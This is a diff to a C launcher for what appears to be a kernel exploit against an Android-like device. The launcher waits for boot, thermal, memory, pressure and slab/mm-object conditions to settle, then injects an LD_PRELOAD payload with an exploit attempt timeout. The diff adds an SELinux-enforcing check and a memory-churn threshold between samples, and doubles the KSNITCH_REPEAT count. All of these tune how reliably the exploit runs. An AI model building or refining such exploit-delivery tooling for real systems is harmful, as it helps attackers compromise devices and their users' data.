@@ -23,6 +23,7 @@
 #define REL_MIN_UPTIME_SEC 60.0
 #define REL_STABLE_SAMPLES 3
 #define REL_MAX_MM_OBJECTS 2048L
+#define REL_MAX_MM_DELTA 64L
 #ifndef REL_MAX_MM_SLABS
 #define REL_MAX_MM_SLABS 48L
 #endif
@@ -42,6 +43,7 @@
 #define CONS_STABLE_SAMPLES 5
 #define CONS_MAX_MM_OBJECTS 1024L
 #define CONS_MAX_MM_SLABS 32L
+#define CONS_MAX_MM_DELTA 32L
 
 #define SAMPLE_INTERVAL_SEC 2
 /* Adaptive fast path: when a sample clears the thresholds with wide margin
@@ -69,6 +71,7 @@ struct metrics {
   double io_psi;
   double uptime;
   int boot_complete;
+  long selinux_enforcing;
   long mm_active;
   long mm_total;
   long mm_slabs;
@@ -85,6 +88,7 @@ struct gate_cfg {
   int stable_samples;
   long max_mm_objects;
   long max_mm_slabs;
+  long max_mm_delta;
   const char *name;
 };
 
@@ -99,6 +103,7 @@ static struct gate_cfg gate = {
     .stable_samples = REL_STABLE_SAMPLES,
     .max_mm_objects = REL_MAX_MM_OBJECTS,
     .max_mm_slabs = REL_MAX_MM_SLABS,
+    .max_mm_delta = REL_MAX_MM_DELTA,
     .name = REL_GATE_NAME,
 };
 
@@ -113,6 +118,7 @@ static const struct gate_cfg gate_conservative = {
     .stable_samples = CONS_STABLE_SAMPLES,
     .max_mm_objects = CONS_MAX_MM_OBJECTS,
     .max_mm_slabs = CONS_MAX_MM_SLABS,
+    .max_mm_delta = CONS_MAX_MM_DELTA,
     .name = "conservador",
 };
 
@@ -247,6 +253,7 @@ static int collect_cheap_metrics(struct metrics *m) {
   memset(m, 0, sizeof(*m));
   m->boot_complete = read_boot_complete();
   return read_uptime(&m->uptime) &&
+         read_long_file("/sys/fs/selinux/enforce", &m->selinux_enforcing) &&
          read_mem_available(&m->mem_kb) &&
          read_load(&m->load1, &m->runnable) &&
          read_psi("/proc/pressure/cpu", &m->cpu_psi) &&
@@ -255,7 +262,8 @@ static int collect_cheap_metrics(struct metrics *m) {
 }
 
 static int metrics_cheap_stable(const struct metrics *m) {
-  return m->boot_complete && m->uptime >= gate.min_uptime_sec &&
+  return m->boot_complete && m->selinux_enforcing == 1 &&
+         m->uptime >= gate.min_uptime_sec &&
          m->mem_kb >= gate.min_mem_kb && m->runnable <= gate.max_runnable &&
          m->cpu_psi <= gate.max_cpu_psi &&
          m->mem_psi <= gate.max_mem_psi && m->io_psi <= gate.max_io_psi;
@@ -267,7 +275,8 @@ static int collect_expensive_metrics(struct metrics *m) {
 }
 
 static int metrics_stable(const struct metrics *m) {
-  return m->boot_complete && m->uptime >= gate.min_uptime_sec &&
+  return m->boot_complete && m->selinux_enforcing == 1 &&
+         m->uptime >= gate.min_uptime_sec &&
          m->mem_kb >= gate.min_mem_kb && m->temp_mc <= gate.max_temp_mc &&
          m->runnable <= gate.max_runnable && m->cpu_psi <= gate.max_cpu_psi &&
          m->mem_psi <= gate.max_mem_psi && m->io_psi <= gate.max_io_psi &&
@@ -280,7 +289,8 @@ static int metrics_stable(const struct metrics *m) {
  * below its ceiling. Implies metrics_stable(). Used to shorten the gate on a
  * clearly idle device without lowering the acceptance thresholds. */
 static int metrics_comfortable(const struct metrics *m) {
-  return m->boot_complete && m->uptime >= gate.min_uptime_sec &&
+  return m->boot_complete && m->selinux_enforcing == 1 &&
+         m->uptime >= gate.min_uptime_sec &&
          m->mem_kb >= gate.min_mem_kb + gate.min_mem_kb / 2 &&
          m->temp_mc <= gate.max_temp_mc - TEMP_HEADROOM_MC &&
          m->runnable <= gate.max_runnable / 2 &&
@@ -422,13 +432,13 @@ int main(int argc, char **argv) {
   fprintf(stderr,
           "[launcher] gate %s: %d amostras/%ds (fast %d/%ds) temp<=%ldC "
           "mem>=%ldGB tarefas<=%d PSI<=%.0f/%.0f/%.0f uptime>=%.0fs mm<=%ld/%ld "
-          "pipe=480x32 timeout=%ds\n",
+          "mm-delta<=%ld pipe=480x32 timeout=%ds\n",
           gate.name, gate.stable_samples, SAMPLE_INTERVAL_SEC,
           FAST_STABLE_SAMPLES, FAST_INTERVAL_SEC,
           gate.max_temp_mc / 1000, gate.min_mem_kb / (1024 * 1024),
           gate.max_runnable, gate.max_cpu_psi, gate.max_mem_psi,
           gate.max_io_psi, gate.min_uptime_sec, gate.max_mm_objects,
-          gate.max_mm_slabs, MAX_WAIT_SEC);
+          gate.max_mm_slabs, gate.max_mm_delta, MAX_WAIT_SEC);
   struct timespec started;
   if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
     perror("[launcher] clock_gettime");
@@ -439,13 +449,26 @@ int main(int argc, char **argv) {
   int gate_passed = 0;
   int pipe_probed = 0;
   int pipe_ok = 0;
+  int have_previous_full = 0;
+  struct metrics previous_full;
+  memset(&previous_full, 0, sizeof(previous_full));
   struct timespec next_sample = started;
   while (!stopped && elapsed_seconds(&started) < MAX_WAIT_SEC) {
     struct metrics m;
     int cheap_valid = collect_cheap_metrics(&m);
     int cheap_stable = cheap_valid && metrics_cheap_stable(&m);
     int full_valid = cheap_stable && collect_expensive_metrics(&m);
-    int accepted = full_valid && metrics_stable(&m);
+    long mm_delta = 0;
+    if (full_valid && have_previous_full) {
+      long active_delta = labs(m.mm_active - previous_full.mm_active);
+      long total_delta = labs(m.mm_total - previous_full.mm_total);
+      long slab_delta = labs(m.mm_slabs - previous_full.mm_slabs) * 32L;
+      mm_delta = active_delta;
+      if (total_delta > mm_delta) mm_delta = total_delta;
+      if (slab_delta > mm_delta) mm_delta = slab_delta;
+    }
+    int churn_stable = !have_previous_full || mm_delta <= gate.max_mm_delta;
+    int accepted = full_valid && metrics_stable(&m) && churn_stable;
     int comfortable = accepted && metrics_comfortable(&m);
     if (!pipe_probed) {
       stable = 0;
@@ -457,14 +480,14 @@ int main(int argc, char **argv) {
     if (full_valid) {
       fprintf(stderr,
               "[launcher] gate=%d/%d phase=%s temp=%.1fC mem=%ldMB runnable=%d "
-              "load=%.2f psi=%.2f/%.2f/%.2f mm=%ld/%ld slabs=%ld "
-              "uptime=%.0fs boot=%d\n",
+              "load=%.2f psi=%.2f/%.2f/%.2f mm=%ld/%ld slabs=%ld dmm=%ld "
+              "uptime=%.0fs boot=%d se=%ld\n",
               stable, gate.stable_samples, comfortable ? "fast" : "baseline",
               m.temp_mc / 1000.0,
               m.mem_kb / 1024,
               m.runnable, m.load1, m.cpu_psi, m.mem_psi, m.io_psi,
-              m.mm_active, m.mm_total, m.mm_slabs, m.uptime,
-              m.boot_complete);
+              m.mm_active, m.mm_total, m.mm_slabs, mm_delta, m.uptime,
+              m.boot_complete, m.selinux_enforcing);
     } else if (cheap_valid) {
       fprintf(stderr,
               "[launcher] gate=0/%d phase=cheap temp=deferred mem=%ldMB "
@@ -486,7 +509,20 @@ int main(int argc, char **argv) {
       if (!pipe_ok) break;
       fprintf(stderr,
               "[launcher] pipe-gate aprovado; iniciando confirmação final\n");
+      previous_full = m;
+      have_previous_full = 1;
+      if (clock_gettime(CLOCK_MONOTONIC, &next_sample) != 0 ||
+          !wait_interval_absolute(
+              &next_sample,
+              comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC)) {
+        break;
+      }
       continue;
+    }
+
+    if (full_valid) {
+      previous_full = m;
+      have_previous_full = 1;
     }
 
     /* Accept once after the pipe probe: full baseline count, or the shorter
@@ -527,7 +563,7 @@ int main(int argc, char **argv) {
       setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "180", 0) != 0 ||
       setenv("BOOT_QUIET_SEC", "0", 0) != 0 ||
       setenv("FUTEX_WAIT_SEC", "1", 0) != 0 ||
-      setenv("KSNITCH_REPEAT", "32", 0) != 0 ||
+      setenv("KSNITCH_REPEAT", "64", 0) != 0 ||
       setenv("LD_PRELOAD", payload, 1) != 0) {
     perror("[launcher] setenv");
     return 1;
